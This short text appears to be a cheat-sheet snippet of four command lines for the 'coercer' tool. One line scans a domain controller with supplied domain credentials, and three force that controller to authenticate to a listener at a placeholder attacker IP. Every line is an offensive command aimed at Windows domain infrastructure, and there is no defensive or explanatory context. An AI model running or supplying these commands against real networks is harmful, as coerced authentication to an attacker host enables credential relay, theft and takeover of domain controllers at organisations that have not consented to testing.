coercer scan -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --target-ip "$DC_IP"
coercer coerce --listener "$ATTACKER_IP" --target-ip "$DC_IP"
coercer coerce -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --listener "$ATTACKER_IP" --target-ip "$DC_IP"
coercer coerce -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --listener "$ATTACKER_IP" --target-ip "$DC_IP" --always-continue
